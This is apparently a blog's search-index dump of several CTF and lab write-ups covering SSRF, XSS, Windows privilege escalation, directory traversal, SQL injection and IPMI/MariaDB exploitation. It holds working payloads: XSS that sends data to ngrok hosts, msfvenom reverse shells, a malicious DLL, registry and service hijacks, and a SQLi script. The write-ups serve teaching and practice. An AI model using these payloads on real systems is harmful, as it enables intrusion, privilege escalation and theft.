Unicode_Encoding as the machine name suggests , and using this payload page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd\rIt works , we can try to read the ssh key for the user code But we can’t. so we can start f","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:0:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Linux Machines"],"content":"Analyzing the binary Downloading the Binary and start analyzing it , searching online found some tools which can help us de-compile a python binary and the binary we have looks like a python binary indeed commands used : git clone https://github.com/LucifielHack/pyinstxtractor.git git clone https://github.com/LucifielHack/pycdc.git wget https://github.com/Kitware/CMake/releases/download/v3.23.1/cmake-3.23.1.tar.gz tar xzvf cmake-3.23.1.tar.gz cd cmake-3.23.1 ./bootstrap make sudo make install cmake ../pycdc/CMakeLists.txt make ../pycdc/ python3 pyinstxtractor.py \u003cbinary\u003e ./pycdc /binary_extracted/binary.pyc\rAnd it seems to have a blacklist , also it uses the curl command to download the files . and if we searched online how to read localfiles with curl will see using the File:// wrapper as we did. ","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:1:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Linux Machines"],"content":"Root Access now we want to login as root , i have downloaded the root id_rsa But unable to login with it. we can try uploading our public key at the /root/.ssh/authorized_keys , then try to connect with our private key. As we have option to download let’s download our public key , But we can’t specify where to save it: Seems the space is the problem , and hence the ’}’ and ’{’ are not filter we can make use of this technique: which the spaces are replaced with the ’,’ then let’s connect : ssh -i unicode root@hackmedia.htb\r","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:2:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Web Exploitation"],"content":"Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to document it in this writeup CTF name NahamconCTF 2022 challenge Hacker Ts category web about HTML injection team 0xCha0s we are introduced with this page , it can take a text as input and we can also specify the color and the output is : Also we can see the Admin tab above it shows the following : So our goal is to view the admin page , mentioning the localhost:5000 should trigger you for SSRF most likely. We can try to inject html code and see if it gets rendered \u003ch1\u003etest\u003c/h1\u003e and it worked indeed , we can try to execute some JS , start with \u003cscript\u003ealert(1);\u003c/script\u003e But it shows empty t-shirt we can try : \u003cp id=\"test\"\u003eaa\u003c/p\u003e \u003cscript\u003e document.getElementById(\"test\").innerHTML += window.location; \u003c/script\u003e\rwe can try to trigger an error while processing to get more information with replacing test with X we got this error , we know it uses wkhtmltoimage to make the process , searching for it found the following articles : Nahmasec here Hacktricks we can craft payloads to make it visit the admin page and view the response for us : ","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:0:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 1 \u003ch1 id=\"0xMesbaha\"\u003e\u003c/h1\u003e \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\", false); xhr.send(); document.getElementById(\"0xMesbaha\").innerHTML = xhr.responseText; \u003c/script\u003e\rthe false in xhr.open : async parameter which is optional , If this value isÂ false, theÂ send()Â method does not return until the response is received.\r","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:1:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 2 we can also use other payload to take the response then send it to remote server : in the text input : \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\"); xhr.onload = function () { var flag = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://ee3f-156-194-180-190.ngrok.io/?flag=\" + flag); exfil.send(); }; xhr.send(); \u003c/script\u003e\rdecode it : ","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:2:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 3 we can also go to another approach , which is hosting exploit.js contains : var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\"); xhr.onload = function () { var flag = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://6ce0-156-194-180-190.ngrok.io/?flag=\" + flag); exfil.send(); }; xhr.send();\rthen on the text input use : \u003cscript src=\"http://6ce0-156-194-180-190.ngrok.io/exploit.js\"\u003e\u003c/script\u003e\rsame output : ","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:3:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Windows Machines"],"content":"During studying the TCM windows privilege escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist this room covers : Service Escalation - Unquoted Service Paths Service Escalation - DLL Hijacking Service Escalation - Registry Service Escalation - Executable Files Service Escalation - binPath Potato Escalation - Hot Potato Registry Escalation - Autorun Registry Escalation - AlwaysInstallElevated Privilege Escalation - Startup Applications Password Mining Escalation - Memory Privilege Escalation - Kernel Exploits quick commands first you need to connect to THM with the openvpn as mentioned in task-1 , let’s drive into the Room itself. As the room is discussing privilege escalation so it assumes you have compromised a windows machine in any way and you are now against the privesc step , that’s why you are given the RDP connection directly. connect with RDP : rdesktop 10.10.14.235 -u user -p password321\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:0:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service-Escalation - Unquoted Service Paths Unquoted path escalation is the case when a service path is like : C:\\Program Files\\example 2\\app.exe\rwhat happens to run the app.exe is as following: # Try :\rC:\\Program.exe\r# if not found try :\rC:\\Program Files\\example.exe\r# if not found try :\rC:\\Program Files\\example 2\\app.exe\rso if we have write access to the C:\\program Files\\ we can place our example.exe so it can be used instead of the actual app.exe , and we can place a malicious app that can get us a reverse connection the mitigation is quite straight forward : \"C:\\Program Files\\example 2\\app.exe\" Attack example : first you need to list the services along with the path : Get-WmiObject win32_service | Select-Object Name, State, PathName\rto query the configuration information for a specified service we use : sc qc unqoutedsvc\rnow as we can see under the BINARY_PATH it is not quoted so we can try our luck there use accesschk64.exe to check our permissions for that path we can write into the path the following : C:\\Program\\Unquoted path service\\common.exe so let’s generate the payload with msfvenom and send it to that path , then start the service msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=1337 -f exe -o common.exe\rnote that when the last sc command halts then terminated you will lose your connection so it is better to make a better than a reverse connection like adding a user to the administrator group instead : msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:1:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - DLL Hijacking My favorite escalation way , DLL Hijacking is very common escalation Factor you should consider,it is a little tricky to detect But easy to abuse. attackers usually copy the suspected executables and run them at their lab to analyze them in this lab we are working in same machine , you need Process Monitor it is like pspy in linux But it tells us details about a process as we will see the idea behind DLL Hijacking is : finding a process searches for a DLL and not able to find it if we the attacker can write to the path , the process searches through , we can craft our own malicious DLL to perform administrative actions add the filters : focusing on this dllhijackservice to understand how it searches for dlls : it searches for a dll under C:\\Temp which we have access to write we craft our payload then place it in the C:\\Temp:\\hijackme.dll then start the service , the next time it starts it will find the missed dll and execute it #include \u003cwindows.h\u003e BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\"cmd.exe /k net localgroup administrators user /add\"); //replace command ExitProcess(0); } return TRUE; }\rcompile it as dll : x86_64-w64-mingw32-gcc dll.c -shared -o hijackme.dll\rmove it and restart the service : the user has been added to the local administrators group ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:2:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - Registry List them : reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\rsearch for a service has NT AUTHORITY\\INTERACTIVE allow FullControl : Get-Acl HKLM:\\SYSTEM\\CurrentControlSet\\Services\\regsvc | fl\ruse the code here add what ever code you want to execute for example add current user to the administrator group cmd.exe /k net localgroup administrators user /add\rcross compile it : i686-w64-mingw32-gcc windows_service.c -o fake.exe\rsend it to the windows then : reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\fake.exe /f\rand we can see the user has been added to the local administrator group, trying to perform an administrative action the ACL will accept our password to grantee this action : ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:3:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - Executable Files finding a service we can overwrite and restart the service will gain us a reverse shell we can search for them by a tool like powerup.ps1 or manually with accesschk64.exe on the services running , we can list them with powershell: Get-Service | Where-Object {$_.Status -eq \"Running\"}\ror cmd : sc.exe query type=service\rwe see this file has write access by every body , we can simply generate with msfvenom a reverse executable and replace it , then start the service again : we could also use the same exe from the registry escalation section ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:4:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - binPath we are after a service that has RW access for Everyone , we can search for it with : .\\accesschk64.exe -wuvc Everyone *\rif we have the : SERVICE_CHANGE_CONFIG we can now leverage our privilege by writing a new configuration then start the service sc config daclsvc binpath= \"net localgroup administrators user /add\"\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:5:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Potato Escalation - Hot Potato the potato attacks are so famous when it comes to windows , actually there are more than one type of potato attack , you can refer to this blog. the attack vector was fixed in MS16-075 , probably windows 7 is vulnerable. we can list last updates : wmic qfe list full /format:table\rsearching for the 3 installs , will find none of them patching the vuln there are multiple ways to attack hot potato like metasploit , powershell , potato.exe , refer here . .\\tater.ps1 Invoke-Tater -Trigger 1 -Command \"net localgroup administrators user /add\"\rand we can see the user has been added to the local administrator Group ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:6:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Registry Escalation - Autorun first you need to run Autoruns64.exe to list the auto runs applications we can notice the program.exe running under C:\\Program Files\\Autorun Program\\ ,now we should use accesschk64.exe to check our privilege on that path it has read/write access For everyone , so we can replace the program.exe with a malicious payload to gain a reverse shell as higher privilege msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=9090 -f exe -o program.exe\rfire up your http server then from the windows machine download it : certutil -urlcache -f http://10.9.0.37:8888/program.exe program.exe\rrename it to program.exe as the auto runner program , copy \u0026 overwrite it : now set you listener : msfconsole -x \"use exploit/multi/handler;set LHOST 10.9.0.37;set LPORT 9090;set payload windows/meterpreter/reverse_tcp;run\"\rlogin with admin account : rdesktop 10.10.174.128 -u TCM -p Hacker12\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:7:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Registry Escalation - AlwaysInstallElevated check AlwaysinstalledElevated is on if the value = 0x1 reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\rcraft msi payload : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi\rmove it to the machine and run it : ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:8:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Privilege Escalation - Startup Applications we can search for this attack vector by running : icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\rwe can see that Builtin\\Users has the F flag meaning full control , Built-in user account isÂ a type of user account that is created during installation simply copy a malicious executable to C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ then when an administrator logs in you will gain a reverse shell ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:9:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Password Mining Escalation - Memory the discussed attack can be helpful in phishing demonstration , will use metasploit as : msfconsole -x \"use auxiliary/server/capture/http_basic;set uripath x ; run\"\rThis module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console and we have captured his password as we see ;) for password mining winpeas are helpful hence it searches for any file its name or content contain words like passwords , key , .. etc ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:10:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Privilege Escalation - Kernel Exploits when it comes to old versions of windows (xp,7,8) it most likely can be exploit using kernel exploitation techniques. to detect if it is vulnerable , run systeminfo ,take the output and pass it to Windows-Exploit-Suggester tool NOTE windows-exploit-suggester can reveal other attack vectors rather than the kernel exploits python windows-exploit-suggester.py --database 2022-04-25-mssb.xls --systeminfo ~/CTFs/Tryhackme/windowsprivescarena/kernel_search\rbut the easiest way is to get a meterpreter shell and use the run local_exploit_suggester note that exploiting not compatible kernel exploit can harm the system , so keep it your last option ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:11:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Automation there a lot of tools you can use like Winpeas , But Let’s Try PowerUp.ps1 ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:12:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Quick commands Download files from your http server to windows : certutil -urlcache -f \u003curl\u003e \u003coutfile_name\u003e Invoke-WebRequest -Uri \u003curl\u003e -OutFile \u003coutfile_name\u003e\rRemember if you are going to use ftp server , in case moving exe files to use binary on Generate payloads : # exe payload to get reverse shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=1337 -f exe -o common.exe # exe payload to execute commands msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe # msi payload (for AlwaysInstallElevated) msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi\rquick msfconsole listener : msfconsole -x \"use exploit/multi/handler;set LHOST \u003cip\u003e;set LPORT \u003cport\u003e;set payload windows/meterpreter/reverse_tcp;run\"\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:13:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Useful Resources : Potatoes_Windows_Privesc windows-enumeration msfveom-cheatsheet PayloadsAllTheThings hacktricks lolbas-project ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:13:1","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Linux Machines"],"content":"In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access. Scanning starting with a basic scanning : nmap -A -T5 10.10.11.125 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor \u0026#8211; Real-Life Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rthen checking the full port scan : nmap -p- 10.10.11.125 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1337/tcp open waste\rEnumeration so let’s start with the port 80 , it is a simple web application no parameters or any user interaction in the main pages. checking the source code we can see the backdoor.htb which we can add to the /etc/hosts and fuzzing Vhosts, But no results directory Busting with dirsearch default wordlist dirsearch -u http://10.10.11.125/ -x 403,404 [00:18:04] 200 - 19KB - /license.txt [00:18:09] 200 - 7KB - /readme.html [00:18:13] 301 - 315B - /wp-admin -\u003e http://10.10.11.125/wp-admin/ [00:18:13] 500 - 3KB - /wp-admin/setup-config.php [00:18:13] 400 - 1B - /wp-admin/admin-ajax.php [00:18:13] 200 - 0B - /wp-config.php [00:18:13] 200 - 0B - /wp-content/ [00:18:14] 500 - 0B - /wp-content/plugins/hello.php [00:18:14] 200 - 776B - /wp-content/upgrade/ [00:18:14] 200 - 1KB - /wp-content/uploads/ [00:18:14] 301 - 318B - /wp-includes -\u003e http://10.10.11.125/wp-includes/ [00:18:14] 200 - 0B - /wp-includes/rss-functions.php [00:18:14] 200 - 0B - /wp-cron.php [00:18:14] 200 - 6KB - /wp-login.php\ri should have noticed it from wappalayzer , however the Directory Busting reveals wordpress is running we can start enumerating possible users with wpscan or start fuzzing username and password but i spent alot of time at this rabbit hole with no lead. we can check the plugins from /wp-content/plugins path , we can know that from this repository showing the default structure of a wordpress web application. searching for it : first result seems promising let’s view it : searchsploit -x 39575.txt\rtrying the POC we have : downloading the file , we can read it confirming the exploit is working using : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../etc/passwd\rwe know their is a user user , now we can try reading other sensitive files on the system check this blog , talking about some interesting files to check whenever you have Directory Traversal / LFI Trying a lot of them until ## Proc File System , we can query processes remember the WASTE port we found in the full port scan, which we do not know the service running on it we can brute-force the Processes running on the system until we know what is the service running at this port using bash : #!/bin/bash i=2 while [ 1 ] do curl \"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline\" 2\u003e/dev/null \u003e response.txt ((i++)) tmp=$(cat response.txt 2\u003e/dev/null) if [[ $tmp == *\"1337\"* ]] then echo \"Process ID $i is the one.\" break fi echo \"Process ID $i failed.\" done\r~/CTFs/HTB/Backdoor$ cat response2.txt /proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done\u003cscript\u003ewindow.close()\u003c/script\u003e%\rand we know now gdb server is running on that port , searching for exploits found this one Foothold trying the steps mentioned in the exploit : msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.","date":"2022-04-23","objectID":"/posts/linux-machines/2022-01-21-backdoor/:0:0","tags":["Hackthebox","wordpress","Waste","directory Traversal","gdb server","screen"],"title":"Backdoor Hackthebox writeup","uri":"/posts/linux-machines/2022-01-21-backdoor/"},{"categories":["Linux Machines"],"content":"[BONUS] After root running crontab -e to see how things were configured to work : we can see the gdb server and the Screen binary cron jobs ","date":"2022-04-23","objectID":"/posts/linux-machines/2022-01-21-backdoor/:0:1","tags":["Hackthebox","wordpress","Waste","directory Traversal","gdb server","screen"],"title":"Backdoor Hackthebox writeup","uri":"/posts/linux-machines/2022-01-21-backdoor/"},{"categories":["Web Exploitation"],"content":"DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy. CTF name DCTF 2022 challenge SQL Tutor category web about SQL injection description I found this awesome site for learning SQL. Check it out! points 200 team 0xCha0s solved By 0xMesbaha and itsFading ","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:0:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Discovery we are introduced with this page which execute fixed SQL statements and take one input to fill the ... in the query However it wasn’t that easy , there are some filters for special characters like [ ' \" `] and for some words like UNION ","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:1:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Enumeration Intercepting the request with Burpsuite to see what is going on , we can see the following : POST /verify_and_sign_text HTTP/1.1 Host: sqltutor.dragonsec.si User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 22 Origin: https://sqltutor.dragonsec.si Te: trailers Connection: close text=dGVzdG1l\u0026alg=sha1\rthe text we sent has base64 encoded , and other argument is sent alg , sending this request to the repeater and view the response body we can see: { \"status\": \"ok\", \"trimmedText\": \"dGVzdG1l\", \"signature\": \"f26039ef86a8c1218019b40e636d66ecfb45324a\", \"debug\": null }\rit return status ok , if we have changed the text being sent to a text contain one of the Blacklisted characters we will got another response body : { \"status\": \"error\", \"message\": \"Dangerous strings:[ ' ] in text!\", \"debug\": null }\rGreat , Forwarding the request , we can see another request is issued : POST /execute HTTP/2 Host: sqltutor.dragonsec.si User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 74 Origin: https://sqltutor.dragonsec.si Te: trailers text=dGVzdG1l\u0026signature=f26039ef86a8c1218019b40e636d66ecfb45324a\u0026queryNo=0\rand this request will be issued only if the first request passed returns status:ok , sending the latest request to the repeater to view the response we can see response body as : { \"status\": \"ok\", \"query\": \"SELECT * FROM users WHERE users.name='testme'\", \"results\": [], \"description\": \"This query selects all users with the name 'testme'.\", \"debug\": null }\rand we can see \"debug:null\" , we can try to add it as a parameter in the /execute request and will have the following results we know now the steps it passed through before the execution , so we know that : 2 requests are issued :\r1st one make sure the text doesn't contain a blacklisted element \"the check is at the client side\"\r2nd one will decode the text form base64 , verify the signature and then execute the query\rwe can skip the first request easily and focus on the 2nd request , providing the debug parameter to know the tests we failed or passed if we try to change the base64 encoded text in the request the old signature will not work and thanks to the debug parameter we know what value should this signature be , so basically we need to issue the request 2 times one to get the valid signature and the other to send the payload associated with the valid signature ","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:2:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Exploitation we can automate the process to save the time and for efficiency , Let’s Build the script : sending the request for the 1st time to extract the signature value : #!/usr/bin/python3 import requests import base64 url= \"https://sqltutor.dragonsec.si/execute\" payload =\"\"\"testme \"\"\".encode('utf-8') encoded=base64.b64encode(payload).decode('utf-8') data = { \"text\":encoded, \"signature\":\"dummy\", \"queryNo\":\"0\", \"debug\":\"true\" } r1= requests.post(url,data=data) print(r1.text)\rwe will extract the signature value then update the signature parameter in the next request resp=r1.text signature= resp.split('\"compare\":\"')[1][0:40] data[\"signature\"]=signature r2= requests.post(url,data=data) print(r2.text)\rGreat the signature is okay and the query is executed , now we are ready to inject our text in the statement to be executed From the debug output the query is : SELECT * FROM users WHERE users.name='test'\rwe need to know number of columns first , update the payload variable : payload =\"\"\"a' order by 8-- \"\"\".encode('utf-8')\rkeep fuzzing downwards until payload =\"\"\"a' order by 4-- \"\"\".encode('utf-8')\rwe know it has 4 columns , now let’s enumerate the tables names : payload =\"\"\"a' UNION SELECT 1,2,3,table_name FROM information_schema.tables--\"\"\".encode('utf-8')\rand we got this huge output : Beautifying the output , we can notice the flags table : Let’s update our payload : payload =\"\"\"a' UNION SELECT 1,2,3,flag FROM flags-- \"\"\".encode('utf-8')\rand finally the flag is here dctf{Pump_7h3_s7r3am_h4s5_up!_353aa965}\r","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:3:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Linux Machines"],"content":"In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version Scanning : basic scanning : nmap -A -T4 10.10.11.124 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ Service Info: Host: shibboleth.htb\rit was suspicious to have only this port , so i performed a udp scan as well : sudo nmap -sU 10.10.11.124 PORT STATE SERVICE 623/udp open asf-rmcp\rwe can add shibboleth.htb to the /etc/hosts and move on to enumeration Enumeration : we can start performing some vhost enumeration : ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -H \"Host: FUZZ.shibboleth.htb\" -fc 302 monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30]\rand add them to the /etc/hosts as well 10.10.11.124 shibboleth.htb monitor.shibboleth.htb zabbix.shibboleth.htb\rthe UDP port we have found eariler seems worthy to search for , and you can find this post from Hacktricks we can use that to find the version first then we can try that : seems to be IPMI-2.0 UserAuth , from the same post we can see : we can try that : and it retrieves a hash , we can see if we can crack it. from hashcat wiki here hashcat -m 7300 hash2 /usr/share/wordlists/rockyou.txt\rso now we have these credentials Administrator:ilovepumkinpie1 after this point i performed some enumeration to the IPMI like : ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P ilovepumkinpie1 user list\rand other But seems i went so far from the foothold :( now we can take a look at the TCP port 80 we have found earlier shibboleth.htb is not interesting at all , all pages are static zabbix.shibboleth.htb has login page so obviously i tried the credentials we have and we are in : Foothold: if you look at the footer you will find the zabbix version: searching for it i found no exploits , you can start doing your research and will find at the documentation here the web interface can execute remote commands actually to exploit it you will do a lot of searching in different options at the web page until you find the page. at this time i was practicing python so why not to write my first published exploit ? you will find it here so let’s download it and try using the exploit and after one minute: Privilege escalation: only one user exist which is ipmi_svc , and we have the password from the ipmi right , worthy trying it : and it works Root Access Uploading Linpeas to the Box and start investigating the output : and as we can see Maria DB is running locally only , and we can see linpeas found the username and the password to connect to the database, we can try interact with it we can read the file except the comments , hence it won’t be applicable cat /etc/zabbix/zabbix_server.conf | grep -v \"#\"\rnow let’s try interact with it : # password :bloooarskybluh mysql -u zabbix -D zabbix -p\rand we are in : this Maria-DB version we see at the banner is Vulnerable to OS command injection , and we can find the exploit here following the steps: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.52 LPORT=1337 -f elf-so -o CVE-2021-27928.so\rset the listener and move the .so file to the Box. then on the box login to the database then : MariaDB [zabbix]\u003e 